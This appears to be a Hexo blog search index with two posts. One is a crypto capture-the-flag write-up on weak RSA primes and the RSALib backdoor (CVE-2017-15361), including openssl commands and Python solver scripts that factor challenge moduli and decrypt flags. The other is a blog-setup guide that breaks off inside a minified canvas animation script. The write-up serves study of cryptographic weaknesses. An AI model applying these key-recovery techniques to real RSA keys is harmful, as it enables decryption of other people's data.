<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>22-11-01-Qq</title>
    <url>/2022/11/01/22-11-01-qq/</url>
    <content><![CDATA[<p>The problem is mainly based on the <strong>backdoor</strong>. In RSA library, it has the CVE of <code>CVE-2017-15361</code>.In this case, we can calculate the prime which is likely random with the equation that:<br>$$<br>Prime &#x3D; k \times M + (65537^{a} \mod M)<br>$$<br>It means that produce the list of primes and make them to collideï¼Œ which satisfy the condition, thus output the target prime.</p>
<p>Alsoï¼Œthe PKI system has different standardsï¼Œ we make some distinctions between different standards. </p>
<span id="more"></span>

<h1 id="RSA-Backdoor"><a href="#RSA-Backdoor" class="headerlink" title="RSA Backdoor"></a>RSA Backdoor</h1><blockquote>
<p>reference: <a href="https://asecuritysite.com/encryption/copper">https://asecuritysite.com/encryption/copper</a></p>
</blockquote>
<h2 id="description"><a href="#description" class="headerlink" title="description"></a>description</h2><p>In RSALib, the prime is produced by the equaction:<br>$$<br>Prime &#x3D; k \times M + 65537^{a} \mod M<br>$$<br>which means that the $M$ is the multiplication of the generated primes.<br>$$<br>M &#x3D; \prod_{i&#x3D;1}^{n}{P_{i}}&#x3D; P_{1} \times P_{2} \times \cdots \times P_{n}<br>$$<br>$M$ must be large and is around the same size of they generated. The weakness is the $k$ and $a$ are relatively small values. The entropy is also must drop. </p>
<p>The problem is common provided with $c$, $e$ and $n$, and just do the command<code>RSA_Backdoor(n)</code>. If the problems satisfy the conditions, the  function will return the $p$ and the $q$.</p>
<h1 id="Openssl"><a href="#Openssl" class="headerlink" title="Openssl"></a>Openssl</h1><blockquote>
<p>relate to the PKI system.</p>
</blockquote>
<h2 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h2><p>In kali, you can directly input the command that <code>openssl</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out [pri].pem 1024</span><br><span class="line">openssl rsa -in [pri].pem -pubout -out [pub].pem</span><br><span class="line"></span><br><span class="line">## if needs to encrypto, like AES or anything else</span><br><span class="line">openssl genrsa [-aes256 -passout pass:111111] -out [pri].key 2048</span><br><span class="line">openssl rsa -in [pri].key -pubout -out [pri].key</span><br><span class="line">Enter pass phrase for [pri].key:</span><br><span class="line"># openssl rsa -in [pri].key -passin pass:111111 -pubout -out [pub].key</span><br><span class="line">writing RSA key</span><br></pre></td></tr></table></figure>



<p>If in python, we can import something to ensure the same consequence. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="comment"># RSA.generate(bits, randfunc = None, e = 65537)</span></span><br><span class="line"><span class="comment"># - bits: bit_length</span></span><br><span class="line"><span class="comment"># - randfunc: Crypto.Random.get_random_bytes()</span></span><br><span class="line"><span class="comment"># - e(int): odd, common is 65537</span></span><br><span class="line">rsa = rsa.generate(<span class="number">1024</span>)</span><br><span class="line"><span class="comment"># export prikey</span></span><br><span class="line">pri = rsa.exportKey()</span><br><span class="line"><span class="comment"># export pubkey</span></span><br><span class="line">pub = rsa.publickey().exportKey()</span><br><span class="line"><span class="comment"># or write in the file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pri.pem&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">    f1.write(pri)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pub.pem&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">    f2.write(pub)</span><br></pre></td></tr></table></figure>



<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># PKCS1 -&gt; PKCS8 privatekey</span><br><span class="line">openssl pkcs8 -topk8 -inform PEM -in rsa_pri.pem -outform PEM -nocrypt -out rsa_pri_pkcs8.pem</span><br><span class="line"></span><br><span class="line"># PKCS8 -&gt; PKCS1 privatekey</span><br><span class="line">openssl rsa -inform PEM -in rsa_pri_pkcs8.pem -outform PEM -out rsa_pri_pkcs1.pem</span><br><span class="line"></span><br><span class="line"># PKCS8 -&gt; PKCS1 publickey</span><br><span class="line">openssl rsa -pubin -in rsa_pub.pem -RSAPublicKey_out -out rsa_pub_pkcs1.pem</span><br><span class="line"></span><br><span class="line"># PKCS1 -&gt; PKCS8 publickey</span><br><span class="line">openssl rsa -RSAPublicKey_in -in rsa_pub_pkcs1.pem -pubout -out rsa_pub_pkcs8.pem</span><br></pre></td></tr></table></figure>



<h1 id="Key-Differences"><a href="#Key-Differences" class="headerlink" title="Key_Differences"></a>Key_Differences</h1><h2 id="PKCS-8"><a href="#PKCS-8" class="headerlink" title="PKCS#8"></a>PKCS#8</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># pubkey</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line"></span><br><span class="line"># prikey</span><br><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">-----END PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line"># prikey encrypted</span><br><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure>



<h2 id="PKCS-1"><a href="#PKCS-1" class="headerlink" title="PKCS#1"></a>PKCS#1</h2><blockquote>
<p>import rsa</p>
<p>the default is PKCS#1</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># pubkey</span><br><span class="line">-----BEGIN RSA PUBLIC KEY-----</span><br><span class="line">-----END RSA PUBLIC KEY-----</span><br><span class="line"></span><br><span class="line"># prikey</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>



<h1 id="Rsatool"><a href="#Rsatool" class="headerlink" title="Rsatool"></a>Rsatool</h1><blockquote>
<p><a href="https://github.com/ius/rsatool">GitHub - ius&#x2F;rsatool: rsatool can be used to calculate RSA and RSA-CRT parameters</a></p>
</blockquote>
<h2 id="requirements"><a href="#requirements" class="headerlink" title="requirements"></a>requirements</h2><ul>
<li>python3.7+</li>
<li>pyasn1</li>
<li>gmpy2</li>
</ul>
<h2 id="usage"><a href="#usage" class="headerlink" title="usage"></a>usage</h2><h3 id="pem"><a href="#pem" class="headerlink" title="pem"></a>pem</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 rsatool.py -f PEM -o key.pem -n [n] -d [d]</span><br><span class="line">python3 rsatool.py -f PEM -o private.pem -p [p] -q [q] -e [e]</span><br></pre></td></tr></table></figure>



<h3 id="der"><a href="#der" class="headerlink" title="der"></a>der</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 rsatool.py -f DER -o key.der -p [p] -q [q]</span><br></pre></td></tr></table></figure>



<h1 id="Pem-in-RSA"><a href="#Pem-in-RSA" class="headerlink" title="Pem in RSA"></a>Pem in RSA</h1><p>The pem can be used in different ways in RSA.</p>
<p>One is to extract the $n$ and the $e$â€”â€” when you get $p$, $q$ from the $n$, we can change <code>flag.enc</code> to $c$ by using the function <code>bytes_to_long()</code>.</p>
<p>The other way is also extract the $n$ and the $e$ â€”â€”however, we MUST construct the primes and others into the <code>pri.pem</code>. Using the <code>pri.pem</code>ï¼Œand we can decrypt the <code>flag.enc</code> to get the message.</p>
<h2 id="1101-qq"><a href="#1101-qq" class="headerlink" title="[1101]qq"></a>[1101]qq</h2><blockquote>
<p>mainly using bytes_to_long()</p>
</blockquote>
<h3 id="flag-enc"><a href="#flag-enc" class="headerlink" title="flag.enc"></a>flag.enc</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CwhE2kUKvphGegBRgnZeM8iE2oTPfmzMYfL4cO262NkQpId+JzH4pEyiS3cdyhDRsU+huX9cnIE=</span><br></pre></td></tr></table></figure>



<h3 id="pub-key-pem"><a href="#pub-key-pem" class="headerlink" title="pub_key.pem"></a>pub_key.pem</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MFMwDQYJKoZIhvcNAQEBBQADQgAwPwI4EkoKC0EfUXgDvsQUYRI+j0/XPrqQxHJ+</span><br><span class="line">v3CKL9WVp5SMk0Njud03to6sxuvPt93fSGHkAsW+wHsCAwEAAQ==</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>



<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pub_key.pem&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pub = RSA.import_key(f.read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(pub.e)</span></span><br><span class="line"><span class="comment"># print(pub.n)</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = base64.b64decode(f.read())</span><br><span class="line">c = bytes_to_long(cipher)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">51926993165717444667250925590498598946377319881662556610174970468991791873398735735101740226707561968771963673353253102616246155657339</span></span><br><span class="line">p, q = RSA_Backdoor(n)</span><br><span class="line">N = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, N))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br><span class="line"><span class="comment"># 2761328357323929478367647741211050583178552594955214217850793389028221</span></span><br><span class="line"><span class="comment"># flag&#123;We@k_Pr1me_1s_d@nger0us&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="ACTF2018-å¯æ€œçš„RSA"><a href="#ACTF2018-å¯æ€œçš„RSA" class="headerlink" title="[ACTF2018]å¯æ€œçš„RSA"></a>[ACTF2018]å¯æ€œçš„RSA</h2><blockquote>
<p>construct to private key</p>
</blockquote>
<h3 id="flag-enc-1"><a href="#flag-enc-1" class="headerlink" title="flag.enc"></a>flag.enc</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GVd1d3viIXFfcHapEYuo5fAvIiUS83adrtMW/MgPwxVBSl46joFCQ1plcnlDGfL19K/3PvChV6n5QGohzfVyz2Z5GdTlaknxvHDUGf5HCukokyPwK/1EYU7NzrhGE7J5jPdi0Aj7xi/Odxy0hGMgpaBLd/nL3N8O6i9pc4Gg3O8soOlciBG/6/xdfN3SzSStMYIN8nfZZMSq3xDDvz4YB7TcTBh4ik4wYhuC77gmT+HWOv5gLTNQ3EkZs5N3EAopy11zHNYU80yv1jtFGcluNPyXYttU5qU33jcp0Wuznac+t+AZHeSQy5vk8DyWorSGMiS+J4KNqSVlDs12EqXEqqJ0uA==</span><br></pre></td></tr></table></figure>



<h3 id="public-key"><a href="#public-key" class="headerlink" title="public.key"></a>public.key</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBJDANBgkqhkiG9w0BAQEFAAOCAREAMIIBDAKCAQMlsYv184kJfRcjeGa7Uc/4</span><br><span class="line">3pIkU3SevEA7CZXJfA44bUbBYcrf93xphg2uR5HCFM+Eh6qqnybpIKl3g0kGA4rv</span><br><span class="line">tcMIJ9/PP8npdpVE+U4Hzf4IcgOaOmJiEWZ4smH7LWudMlOekqFTs2dWKbqzlC59</span><br><span class="line">NeMPfu9avxxQ15fQzIjhvcz9GhLqb373XDcn298ueA80KK6Pek+3qJ8YSjZQMrFT</span><br><span class="line">+EJehFdQ6yt6vALcFc4CB1B6qVCGO7hICngCjdYpeZRNbGM/r6ED5Nsozof1oMbt</span><br><span class="line">Si8mZEJ/Vlx3gathkUVtlxx/+jlScjdM7AFV5fkRidt0LkwosDoPoRz/sDFz0qTM</span><br><span class="line">5q5TAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>



<h3 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">2. public.keyï¼šrb-&gt;RSA.import_key-&gt;e,n</span></span><br><span class="line"><span class="string">3. construct to privatekey</span></span><br><span class="line"><span class="string">    1. (n,e,d,(p),(q)) to save</span></span><br><span class="line"><span class="string">    2. RSA.construct() to construct</span></span><br><span class="line"><span class="string">    3. 2.exportKey() import</span></span><br><span class="line"><span class="string">    4. RSA.importKey() export</span></span><br><span class="line"><span class="string">    5. PKCS1_OAEP.new()  -&gt; important!</span></span><br><span class="line"><span class="string">4. d by using invert(), and int(d) to get integer</span></span><br><span class="line"><span class="string">5. use private key to decrypt</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;public.key&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pub = RSA.import_key(f.read())</span><br><span class="line">e = pub.e</span><br><span class="line">n = pub.n</span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"><span class="comment"># n = 79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># yafu-x64/factordb.com</span></span><br><span class="line">p = <span class="number">3133337</span></span><br><span class="line">q = <span class="number">25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939</span></span><br><span class="line">N = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, N))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = b64decode(f.read())</span><br><span class="line">    <span class="comment"># print(c)</span></span><br><span class="line">con = RSA.construct((n, e, d, p, q))</span><br><span class="line">pri = PKCS1_OAEP.new(RSA.importKey(con.exportKey()))</span><br><span class="line">m = pri.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># b&#x27;afctf&#123;R54_|5_$0_B0rin9&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>openssl</tag>
        <tag>factor</tag>
        <tag>backdoor</tag>
      </tags>
  </entry>
  <entry>
    <title>22-10-21-Hexo-Build-Beautify</title>
    <url>/2022/10/21/22-10-21-hexo-build-beautify/</url>
    <content><![CDATA[<p>The article is used to record how to use hexo to build my own blog. I will try my best to make records by using English. To Be Honest, this is really somewhat a hard challenge for me.</p>
<p>The problems and some solutions are as follows.</p>
<span id="more"></span>

<blockquote>
<p><a href="https://hexo-next.readthedocs.io/">https://hexo-next.readthedocs.io/</a></p>
</blockquote>
<h1 id="BUILD-HEXO"><a href="#BUILD-HEXO" class="headerlink" title="BUILD HEXO"></a>BUILD HEXO</h1><blockquote>
<p>preparation: </p>
<p>git</p>
<p>node.js</p>
</blockquote>
<p>after the installation, test: </p>
<p><code>node -v</code>&#x2F;<code>npm -v</code>&#x2F; <code>git -v</code></p>
<h2 id="HEXO-BLOG"><a href="#HEXO-BLOG" class="headerlink" title="HEXO BLOG"></a>HEXO BLOG</h2><blockquote>
<p>all use git-bash</p>
</blockquote>
<ul>
<li>to install hexo:</li>
</ul>
<p><code>npm install -g hexo-cli</code></p>
<ul>
<li>init hexo and build blog:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init [blogname]</span><br><span class="line">cd [blogname]</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>

<ul>
<li>after building the common commands:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate/hexo g</span><br><span class="line">hexo server/hexo s</span><br><span class="line">hexo deploy/hexo d(unless everything is OK)</span><br><span class="line"># hexo clean &amp;&amp; hexo g &amp; hexo s</span><br></pre></td></tr></table></figure>

<h2 id="NEW-POST"><a href="#NEW-POST" class="headerlink" title="NEW POST"></a>NEW POST</h2><ul>
<li>set markdown</li>
</ul>
<p>In <code>scaffolds\post.md</code>, above the <code>!--more--</code> can make the article excerption</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">categories: </span><br><span class="line">tags: </span><br><span class="line">mathjax: true</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line"># to limit the length of article</span><br></pre></td></tr></table></figure>

<ul>
<li>new post</li>
</ul>
<p><code>hexo new [postname]</code></p>
<p>To make the article and everting clean, follow the standard <code>YY-MM-DD-article-name.md</code></p>
<p>And the categories are as follows: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">categories:</span><br><span class="line">	- Studying</span><br><span class="line">	- Reading</span><br><span class="line">	- Recording</span><br><span class="line">	- Amusing</span><br></pre></td></tr></table></figure>



<h1 id="DRAFT-x2F-BAND-GITHUB-amp-TOKEN"><a href="#DRAFT-x2F-BAND-GITHUB-amp-TOKEN" class="headerlink" title="DRAFT&#x2F;BAND GITHUB&amp;TOKEN"></a>DRAFT&#x2F;BAND GITHUB&amp;TOKEN</h1><ul>
<li>register the github account</li>
<li>new repository</li>
</ul>
<p>Create a new repository, github has reserved your own website.</p>
<p><code>[githubaccount].github.io</code></p>
<ul>
<li>use token to authenticate</li>
</ul>
<p>In the root menu, add the follows to the file <strong>_config.yml</strong>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># install:</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line"></span><br><span class="line"># _config.yml</span><br><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: https://[token]@github.com/[githubaccount]/[githubaccount].github.io</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>

<ul>
<li>git config</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># if authentication failed</span><br><span class="line">git config --globaluser.name &quot;yourname&quot;</span><br><span class="line">git config --global user.email &quot;youremail&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>after everything above is ready</li>
</ul>
<p><code>hexo d</code>, test if the running is well.</p>
<p>the default website is: <code>localhost:4000/</code></p>
<h1 id="MATH"><a href="#MATH" class="headerlink" title="MATH"></a>MATH</h1><p>If the markdown can not display well,  maybe the renderer gets wrong.</p>
<p>The hexo default renderer is <code>hexo-renderer-marked</code>.</p>
<p>You can use <code>hexo-renderer-kramed</code> or <code>@upupming/renderer-markdown-it-plus</code> to replace the default one.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm i @upupming/hexo-renderer-markdown-it-plus --save</span><br></pre></td></tr></table></figure>

<p><strong>DONâ€™T FORGET!</strong></p>
<p>In <code>_config.next.yml</code> set: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">math:</span><br><span class="line">  # Default (false) will load mathjax / katex script on demand.</span><br><span class="line">  # That is it only render those page which has `mathjax: true` in front-matter.</span><br><span class="line">  # If you set it to true, it will load mathjax / katex script EVERY PAGE.</span><br><span class="line">  every_page: true</span><br><span class="line"></span><br><span class="line">  mathjax:</span><br><span class="line">    enable: true</span><br><span class="line">    # Available values: none | ams | all</span><br><span class="line">    tags: none</span><br><span class="line"></span><br><span class="line">  katex:</span><br><span class="line">    enable: false</span><br><span class="line">    # See: https://github.com/KaTeX/KaTeX/tree/master/contrib/copy-tex</span><br><span class="line">    copy_tex: false</span><br></pre></td></tr></table></figure>

<p>and in your every post fonts, add <code>math: true</code></p>
<h1 id="NOT-404"><a href="#NOT-404" class="headerlink" title="NOT 404"></a>NOT 404</h1><h2 id="question"><a href="#question" class="headerlink" title="question"></a>question</h2><p>When I visit the tags, the website always return <code>404</code>. I search for some solutions all over the web. However, most of them are wrong, until I see the solution in the Zhihu.</p>
<h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><h3 id="new-page"><a href="#new-page" class="headerlink" title="new page"></a>new page</h3><p>In the root of the blog, open the git bash command.</p>
<p><code>hexo new page &quot;tags&quot;</code></p>
<h3 id="edit-the-index"><a href="#edit-the-index" class="headerlink" title="edit the index"></a>edit the index</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: tags</span><br><span class="line">type: tags</span><br><span class="line">layout: tags # /theme/next/layout/[tags].njk</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<p><em>Behind the layout, to write down <strong>the name of the target njk</strong>, which is in the depth of the file path.</em></p>
<h3 id="edit-the-config-file"><a href="#edit-the-config-file" class="headerlink" title="edit the _config file"></a>edit the _config file</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Dirctory</span><br><span class="line">tag_dir: tags</span><br></pre></td></tr></table></figure>

<p>Make the names one-to-one.</p>
<h1 id="CALCULATE-WORDS"><a href="#CALCULATE-WORDS" class="headerlink" title="CALCULATE WORDS"></a>CALCULATE WORDS</h1><h2 id="hexo-word-counter"><a href="#hexo-word-counter" class="headerlink" title="hexo-word-counter"></a>hexo-word-counter</h2><p>Install the plugin <code>hexo-word-counter</code>, in the root path of blog. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-word-counter</span><br><span class="line">hexo clean &amp;&amp; hexo g</span><br></pre></td></tr></table></figure>

<h2 id="config"><a href="#config" class="headerlink" title="config"></a>config</h2><p>In <code>_config.yml</code>, at the end of the file add the follows: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">symbols_count_time:</span><br><span class="line">  symbols: true</span><br><span class="line">  time: true</span><br><span class="line">  total_symbols: true</span><br><span class="line">  total_time: true</span><br><span class="line">  exclude_codeblock: false</span><br><span class="line">  awl: 4</span><br><span class="line">  wpm: 275</span><br><span class="line">  suffix: &quot;mins.&quot;</span><br></pre></td></tr></table></figure>

<p><em>In <code>_config.next.yml</code>, edit the finding <code>item_text_total: false</code>. Change <code>false</code> to <code>true</code>.</em></p>
<h1 id="BACKGROUND-PICTURE"><a href="#BACKGROUND-PICTURE" class="headerlink" title="BACKGROUND PICTURE"></a>BACKGROUND PICTURE</h1><p>I tried more ways to set background picture, more thins were wrong. Util I saw an article, I done this thing.</p>
<p>When I reflected all my things on this part, I knew the keypoint part was to **add the correct source path **to <code>next_config</code>.</p>
<h2 id="js-file"><a href="#js-file" class="headerlink" title="js file"></a>js file</h2><p>The NexT v8 has the <code>canvas-nest.js</code> in <code>themes\next\source\js</code>.</p>
<p>If you donâ€™t have the <strong>JS</strong> file, create the new file containsï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">!<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">function</span> <span class="title function_">n</span>(<span class="params">n,e,t</span>)&#123;<span class="keyword">return</span> n.<span class="title function_">getAttribute</span>(e)||t&#125;<span class="keyword">function</span> <span class="title function_">e</span>(<span class="params">n</span>)&#123;<span class="keyword">return</span> <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(n)&#125;<span class="keyword">function</span> <span class="title function_">t</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> t=<span class="title function_">e</span>(<span class="string">&quot;script&quot;</span>),o=t.<span class="property">length</span>,i=t[o-<span class="number">1</span>];<span class="keyword">return</span>&#123;<span class="attr">l</span>:o,<span class="attr">z</span>:<span class="title function_">n</span>(i,<span class="string">&quot;zIndex&quot;</span>,-<span class="number">1</span>),<span class="attr">o</span>:<span class="title function_">n</span>(i,<span class="string">&quot;opacity&quot;</span>,<span class="number">.5</span>),<span class="attr">c</span>:<span class="title function_">n</span>(i,<span class="string">&quot;color&quot;</span>,<span class="string">&quot;0,0,0&quot;</span>),<span class="attr">n</span>:<span class="title function_">n</span>(i,<span class="string">&quot;count&quot;</span>,<span class="number">99</span>)&#125;&#125;<span class="keyword">function</span> <span class="title function_">o</span>(<span class="params"></span>)&#123;c=u.<span class="property">width</span>=<span class="variable language_">window</span>.<span class="property">innerWidth</span>||<span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientWidth</span>||<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">clientWidth</span>,a=u.<span class="property">height</span>=<span class="variable language_">window</span>.<span class="property">innerHeight</span>||<span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientHeight</span>||<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">clientHeight</span>&#125;<span class="keyword">function</span> <span class="title function_">i</span>(<span class="params"></span>)&#123;l.<span class="title function_">clearRect</span>(<span class="number">0</span>,<span class="number">0</span>,c,a);<span class="keyword">var</span> n,e,t,o,u,d,x=[w].<span class="title function_">concat</span>(y);y.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">i</span>)&#123;<span class="keyword">for</span>(i.<span class="property">x</span>+=i.<span class="property">xa</span>,i.<span class="property">y</span>+=i.<span class="property">ya</span>,i.<span class="property">xa</span>*=i.<span class="property">x</span>&gt;c||i.<span class="property">x</span>&lt;<span class="number">0</span>?-<span class="number">1</span>:<span class="number">1</span>,i.<span class="property">ya</span>*=i.<span class="property">y</span>&gt;a||i.<span class="property">y</span>&lt;<span class="number">0</span>?-<span class="number">1</span>:<span class="number">1</span>,l.<span class="title function_">fillRect</span>(i.<span class="property">x</span>-<span class="number">.5</span>,i.<span class="property">y</span>-<span class="number">.5</span>,<span class="number">1</span>,<span class="number">1</span>),e=<span class="number">0</span>;e&lt;x.<span class="property">length</span>;e++)n=x[e],i!==n&amp;&amp;<span class="literal">null</span>!==n.<span class="property">x</span>&amp;&amp;<span class="literal">null</span>!==n.<span class="property">y</span>&amp;&amp;(o=i.<span class="property">x</span>-n.<span class="property">x</span>,u=i.<span class="property">y</span>-n.<span class="property">y</span>,d=o*o+u*u,d&lt;n.<span class="property">max</span>&amp;&amp;(n===w&amp;&amp;d&gt;=n.<span class="property">max</span>/<span class="number">2</span>&amp;&amp;(i.<span class="property">x</span>-=<span class="number">.03</span>*o,i.<span class="property">y</span>-=<span class="number">.03</span>*u),t=(n.<span class="property">max</span>-d)/n.<span class="property">max</span>,l.<span class="title function_">beginPath</span>(),l.<span class="property">lineWidth</span>=t/<span class="number">2</span>,l.<span class="property">strokeStyle</span>=<span class="string">&quot;rgba(&quot;</span>+m.<span class="property">c</span>+<span class="string">&quot;,&quot;</span>+(t+<span class="number">.2</span>)+<span class="string">&quot;)&quot;</span>,l.<span class="title function_">moveTo</span>(i.<span class="property">x</span>,i.<span class="property">y</span>),l.<span class="title function_">lineTo</span>(n.<span class="property">x</span>,n.<span class="property">y</span>),l.<span class="title function_">stroke</span>()));x.<span class="title function_">splice</span>(x.<span class="title function_">indexOf</span>(i),<span class="number">1</span>)&#125;),<span class="title function_">r</span>(i)&#125;<span class="keyword">var</span> c,a,u=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;canvas&quot;</span>),m=<span class="title function_">t</span>(),d=<span class="string">&quot;c_n&quot;</span>+m.<span class="property">l</span>,l=u.<span class="title function_">getContext</span>(<span class="string">&quot;2d&quot;</span>),r=<span class="variable language_">window</span>.<span class="property">requestAnimationFrame</span>||<span class="variable language_">window</span>.<span class="property">webkitRequestAnimationFrame</span>||<span class="variable 